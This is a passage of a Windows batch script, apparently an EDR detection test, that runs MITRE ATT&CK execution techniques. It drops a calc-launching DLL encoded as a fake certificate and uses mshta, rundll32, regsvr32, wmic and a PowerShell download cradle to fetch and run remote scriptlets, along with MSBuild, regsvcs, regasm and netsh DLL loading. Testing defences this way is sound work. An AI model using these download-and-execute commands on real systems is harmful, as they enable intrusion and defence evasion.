REM start line 120
REM end line 232
echo [+] Starting script execution at %time% %date%
echo %time% %date%: [+] Dumping DLL file which runs calc.exe (x86)
REM - DLL taken from https://github.com/peterferrie/win-exec-calc-shellcode
echo -----BEGIN CERTIFICATE----- > fi.b64
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAA0AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5v >> fi.b64
echo dCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACpUmPY7TMNi+0zDYvtMw2L >> fi.b64
echo i93Di+wzDYvtMw2L7DMNiy07RIvsMw2LLTtKi+wzDYtSaWNo7TMNiwAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAFBFAABMAQMAwd7lUgAAAAAAAAAA4AAOIQsBBwoAAgAA >> fi.b64
echo AAQAAAAAAAAAEAAAABAAAAAgAAAAAAAQABAAAAACAAAEAAAAAAAAAAQAAAAAAAAA >> fi.b64
echo AEAAAAAEAAAAAAAAAgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAgAABYAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAACAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAABdAAAAABAAAAACAAAABAAA >> fi.b64
echo AAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAAWAAAAAAgAAAAAgAAAAYAAAAAAAAAAAAA >> fi.b64
echo AAAAAEAAAEAucmVsb2MAAAgAAAAAMAAAAAIAAAAIAAAAAAAAAAAAAAAAAABAAABC >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAFWL7OgIAAAAM8BdwgwAzMxgMdJSaGNhbGNUWVJRZIty >> fi.b64
echo MIt2DIt2DK2LMIt+GItfPItcH3iLdB8gAf6LVB8kD7csF0JCrYE8B1dpbkV18It0 >> fi.b64
echo HxwB/gM8rv/XWFhhwwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAMHe5VIAAAAAMiAAAAEAAAABAAAAAQAAACggAAAsIAAAMCAAAAAQAABMIAAA >> fi.b64
echo AAB3MzItZGxsLXJ1bi1zaGVsbGNvZGUuZGxsAF9EbGxNYWluQDEyAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAA== >> fi.b64
echo -----END CERTIFICATE----- >> fi.b64

echo **********************************************
echo *      Testing Mitre ATT&CK PAYLOADS         *
echo **********************************************
echo %time% %date% [+] T1170 - Testing mshtha
start "" cmd /c mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct").Exec();close();
echo Execution Finished at %time% %date%
echo Command Excuted: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct").Exec();close();
timeout 5

echo %time% %date% [+] T1086 - Testing powershell cradle - WebClient
start "" cmd /c powershell -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"
echo Execution Finished at %time% %date%
echo Command Excuted: powershell -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"
timeout 5


echo %time% %date% [+] T1121 - Testing regsvcs
start "" cmd /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll
start "" cmd /c C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe AllTheThings.dll
echo Execution Finished at %time% %date%
start "" cmd /c C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regsvcs.exe AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regsvcs.exe AllTheThings.dll
start "" cmd /c C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll

timeout 5

echo %time% %date% [+] T1121 - Testing regasm
start "" cmd /c C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe /U AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe /U AllTheThings.dll
start "" cmd /c C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe /U AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe /U AllTheThings.dll

timeout 5

echo %time% %date% [+] T1121 - Testing regasm x64
start "" cmd /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThings.dll
start "" cmd /c C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll

timeout 5

echo %time% %date% [+] T1117 -  Testing regsvr32
start "" cmd /c regsvr32.exe /s /u /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp_calc.sct scrobj.dll
echo Execution Finished at %time% %date%
echo Command Excuted: regsvr32.exe /s /u /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp_calc.sct scrobj.dll

timeout 5

echo %time% %date% [+] T1127 - Testing MSBuild

echo ^<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003"^> > xxxFile.csproj
echo    ^<ItemGroup^>   >> xxxFile.csproj
echo         ^<Binaries Include="*.dll;*.exe"/^>   >> xxxFile.csproj
echo     ^</ItemGroup^>   >> xxxFile.csproj
echo   ^<Target Name="SetACL"^>   >> xxxFile.csproj
echo         ^<Exec Command="calc.exe"/^>   >> xxxFile.csproj
echo     ^</Target^>   >> xxxFile.csproj
echo ^</Project^>   >> xxxFile.csproj

start "" cmd /c C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe xxxFile.csproj
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe xxxFile.csproj

timeout 5

echo %time% %date% [+] T1047 - Testing wmic download
start "" cmd /c wmic process get brief /format:"https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Wmic_calc.xsl"
echo Execution Finished at %time% %date%
echo Command Excuted: wmic process get brief /format:"https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Wmic_calc.xsl"

timeout 5

echo %time% %date% [+] T1128 - Testing netsh.exe dll exec 
start "" cmd /c netsh trace start capture=yes filemode=append persistent=yes tracefile=trace.etl    
start "" cmd /c netsh trace show status    
start "" cmd /c netsh.exe add helper AllTheThings.dll
start "" cmd /c netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8000 connectaddress=192.168.1.1
start "" cmd /c netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
start "" cmd /c netsh trace stop
echo Execution Finished at %time% %date%
echo Command Excuted: netsh trace start capture=yes filemode=append persistent=yes tracefile=trace.etl    
echo Command Excuted: netsh trace show status 
echo Command Excuted: netsh.exe add helper AllTheThings.dll
echo Command Excuted: netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8000 connectaddress=192.168.1.1
echo Command Excuted: netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
echo Command Excuted: netsh trace stop

timeout 5
 
echo %time% %date% [+] T1085 - Testing rundll32 execution
start "" cmd /c rundll32 AllTheThings.dll,EntryPoint
echo Execution Finished at %time% %date%
echo Command Excuted: rundll32 AllTheThings.dll,EntryPoint

timeout 5

echo %time% %date% [+] T1085 - Testing rundll32 download & exec
start "" cmd /c rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test")
echo Execution Finished at %time% %date%
echo Command Excuted: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test")

timeout 5